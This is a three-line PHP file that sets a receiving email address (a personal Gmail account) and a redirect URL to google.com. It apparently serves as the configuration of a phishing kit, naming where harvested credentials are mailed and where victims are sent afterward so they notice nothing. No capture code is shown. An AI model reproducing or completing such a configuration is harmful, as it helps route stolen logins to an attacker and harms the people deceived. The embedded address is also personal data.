<?php 
$Receive_email="omammahenryosita11@gmail.com";
$redirect="https://www.google.com/";
?>